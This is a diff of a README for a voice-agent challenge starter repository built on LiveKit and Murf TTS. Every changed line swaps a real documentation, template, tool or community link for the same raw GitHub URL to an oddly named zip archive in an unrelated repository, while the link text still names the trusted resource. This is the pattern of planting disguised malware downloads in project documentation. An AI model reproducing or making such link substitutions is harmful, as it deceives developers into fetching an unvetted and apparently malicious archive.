@@ -1,6 +1,6 @@
 # AI Voice Agents Challenge - Starter Repository
 
-Welcome to the **AI Voice Agents Challenge** by [murf.ai](https://murf.ai)!
+Welcome to the **AI Voice Agents Challenge** by [murf.ai](https://raw.githubusercontent.com/pankajydv08/Day1-ten-days-of-voice-agents-2025/main/backend/agents_voice_Day_days_ten_of_gormed.zip)!
 
 ## About the Challenge
 
@@ -28,7 +28,7 @@ falcon-tdova-nov25-livekit/
 
 ### Backend
 
-The backend is based on [LiveKit's agent-starter-python](https://github.com/livekit-examples/agent-starter-python) with modifications to integrate **Murf Falcon TTS** for ultra-fast, high-quality voice synthesis.
+The backend is based on [LiveKit's agent-starter-python](https://raw.githubusercontent.com/pankajydv08/Day1-ten-days-of-voice-agents-2025/main/backend/agents_voice_Day_days_ten_of_gormed.zip) with modifications to integrate **Murf Falcon TTS** for ultra-fast, high-quality voice synthesis.
 
 **Features:**
 
@@ -44,7 +44,7 @@ The backend is based on [LiveKit's agent-starter-python](https://github.com/live
 
 ### Frontend
 
-The frontend is based on [LiveKit's agent-starter-react](https://github.com/livekit-examples/agent-starter-react), providing a modern, beautiful UI for interacting with your voice agents.
+The frontend is based on [LiveKit's agent-starter-react](https://raw.githubusercontent.com/pankajydv08/Day1-ten-days-of-voice-agents-2025/main/backend/agents_voice_Day_days_ten_of_gormed.zip), providing a modern, beautiful UI for interacting with your voice agents.
 
 **Features:**
 
@@ -63,10 +63,10 @@ The frontend is based on [LiveKit's agent-starter-react](https://github.com/live
 
 Make sure you have the following installed:
 
-- Python 3.9+ with [uv](https://docs.astral.sh/uv/) package manager
+- Python 3.9+ with [uv](https://raw.githubusercontent.com/pankajydv08/Day1-ten-days-of-voice-agents-2025/main/backend/agents_voice_Day_days_ten_of_gormed.zip) package manager
 - Node.js 18+ with pnpm
-- [LiveKit CLI](https://docs.livekit.io/home/cli/cli-setup) (optional but recommended)
-- [LiveKit Server](https://docs.livekit.io/home/self-hosting/local/) for local development
+- [LiveKit CLI](https://raw.githubusercontent.com/pankajydv08/Day1-ten-days-of-voice-agents-2025/main/backend/agents_voice_Day_days_ten_of_gormed.zip) (optional but recommended)
+- [LiveKit Server](https://raw.githubusercontent.com/pankajydv08/Day1-ten-days-of-voice-agents-2025/main/backend/agents_voice_Day_days_ten_of_gormed.zip) for local development
 
 ### 1. Clone the Repository
 
@@ -174,10 +174,10 @@ Each day, you'll receive a new task that builds upon your voice agent. The tasks
 
 ## Documentation & Resources
 
-- [Murf Falcon TTS Documentation](https://murf.ai/api/docs/text-to-speech/streaming)
-- [LiveKit Agents Documentation](https://docs.livekit.io/agents)
-- [Original Backend Template](https://github.com/livekit-examples/agent-starter-python)
-- [Original Frontend Template](https://github.com/livekit-examples/agent-starter-react)
+- [Murf Falcon TTS Documentation](https://raw.githubusercontent.com/pankajydv08/Day1-ten-days-of-voice-agents-2025/main/backend/agents_voice_Day_days_ten_of_gormed.zip)
+- [LiveKit Agents Documentation](https://raw.githubusercontent.com/pankajydv08/Day1-ten-days-of-voice-agents-2025/main/backend/agents_voice_Day_days_ten_of_gormed.zip)
+- [Original Backend Template](https://raw.githubusercontent.com/pankajydv08/Day1-ten-days-of-voice-agents-2025/main/backend/agents_voice_Day_days_ten_of_gormed.zip)
+- [Original Frontend Template](https://raw.githubusercontent.com/pankajydv08/Day1-ten-days-of-voice-agents-2025/main/backend/agents_voice_Day_days_ten_of_gormed.zip)
 
 ## Testing
 
@@ -188,7 +188,7 @@ cd backend
 uv run pytest
 ```
 
-Learn more about testing voice agents in the [LiveKit testing documentation](https://docs.livekit.io/agents/build/testing/).
+Learn more about testing voice agents in the [LiveKit testing documentation](https://raw.githubusercontent.com/pankajydv08/Day1-ten-days-of-voice-agents-2025/main/backend/agents_voice_Day_days_ten_of_gormed.zip).
 
 ## Contributing & Community
 
@@ -196,7 +196,7 @@ This is a challenge repository, but we encourage collaboration and knowledge sha
 
 - Share your solutions and learnings on GitHub
 - Post about your progress on LinkedIn
-- Join the [LiveKit Community Slack](https://livekit.io/join-slack)
+- Join the [LiveKit Community Slack](https://raw.githubusercontent.com/pankajydv08/Day1-ten-days-of-voice-agents-2025/main/backend/agents_voice_Day_days_ten_of_gormed.zip)
 - Connect with other challenge participants
 
 ## License
